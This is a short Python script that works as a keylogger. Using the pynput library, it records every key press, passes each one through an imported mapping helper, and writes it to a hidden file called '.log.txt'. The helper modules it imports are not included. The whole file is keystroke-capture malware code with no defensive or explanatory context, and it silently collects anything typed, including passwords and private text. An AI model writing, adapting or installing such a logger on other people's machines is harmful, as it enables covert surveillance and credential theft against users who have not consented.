from pynput.keyboard import Key, Listener
from key_map import get_mapped_key
from logger import write_on_file

LOG_FILE = ".log.txt"

def on_press(key):
	key = get_mapped_key(key)
	write_on_file(LOG_FILE, key)

def main():
	with Listener(on_press=on_press) as listener:
		listener.join()


if __name__ == "__main__":
	main()

